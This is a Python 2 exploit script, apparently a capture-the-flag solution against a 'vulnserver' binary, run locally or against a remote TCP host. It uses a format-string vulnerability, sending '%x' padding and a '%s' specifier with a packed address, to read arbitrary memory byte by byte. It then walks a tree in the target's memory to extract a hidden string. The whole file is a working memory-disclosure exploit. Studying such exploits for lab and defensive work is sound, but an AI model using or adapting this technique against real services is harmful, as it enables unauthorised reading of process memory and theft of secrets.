#!/usr/bin/env python
import sys
sys.dont_write_bytecode = True
import comm
import struct

def send_msg(sock, msg):
    buf = ""
    buf += struct.pack("<Q", len(msg))
    buf += msg
    sock.sendall(buf)

def get_byte(sock, addr):
    fstr  = "%16x" * 14 # skip to buf
    fstr += "%16x" * 16 # skip to end of buf
    fstr += "%s"        # get bytes at addr
    fstr += "ABCDE\x00" # marker
    fstr += struct.pack("<Q", addr)

    send_msg(sock, fstr)
    sock.recv(16 * (14 + 16))
    buf = comm.recv_until(sock, "ABCDE")[:-5]

    return buf[0] if len(buf) > 0 else "\x00"

def get_type(sock, pnode):
    return get_byte(sock, pnode)

def get_child(sock, pnode, idx):
    addrstr = ""
    for offset in range(8):
        addrstr += get_byte(sock, pnode + 8 * (1 + idx) + offset)
    return struct.unpack("<Q", addrstr)[0]

def tree_walk(sock, pnode):
    if get_type(sock, pnode) != "I":
        return ""
    left_addr = get_child(sock, pnode, 0)
    right_addr = get_child(sock, pnode, 1)
    if left_addr != 0:
        return "1" + tree_walk(sock, left_addr)
    return "0" + tree_walk(sock, right_addr)

def main(argv):
    if argv[1] == "local":
        sock = comm.connect_to_subprocess(["../vulnserver/vulnserver"])
    elif argv[1] == "remote":
        sock = comm.connect_to_tcpserver(argv[2:4])
    else:
        print "Invalid argument"
        sys.exit(-1)
    pnode = int(comm.recv_until(sock, "\n"), 16)
    print "addr: %016x" % pnode
    binstr = tree_walk(sock, pnode)
    assert len(binstr) % 8 == 0
    print "".join(
        [chr(int(binstr[i*8:(i+1)*8],2)) for i in range(len(binstr) / 8)]
    )

    sock.send(struct.pack("<Q", 0))
    sock.close()

if __name__ == "__main__":
    main(sys.argv)
